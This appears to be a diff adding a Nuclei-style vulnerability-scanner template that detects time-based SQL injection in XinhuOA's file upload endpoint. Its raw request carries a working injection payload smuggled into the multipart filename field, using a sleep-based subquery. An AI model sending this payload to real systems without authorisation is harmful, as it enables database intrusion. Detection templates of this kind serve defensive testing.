@@ -1,0 +1,43 @@
+id: xinhuoa-sqli-upfile
+
+info:
+  name: XinhuOA SQL Injection in upfile Endpoint
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects time-based SQL injection vulnerability in XinhuOA's upfile endpoint
+    through malicious filename parameter in file upload functionality.
+  tags: sqli,time-based,oasystem,xinhuoa,file-upload
+
+http:
+  - raw:
+      - |
+        POST /index.php?a=upfile&n=uploaw|api&d=task HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXXXXXXXX
+
+        ------WebKitFormBoundaryitXXXXXXXX
+        Content-Disposition: form-data; name="file"; filename="a',web=(select if(1=1,sleep(5),0))--,png"
+
+        test
+        ------WebKitFormBoundaryitXXXXXXXX--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "time_taken > 5000"
+      - type: word
+        words:
+          - "sleep(5)"
+          - "SQL syntax"
+        part: body
+        condition: or
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(SQL syntax error|MySQL server|You have an error in your SQL syntax)"
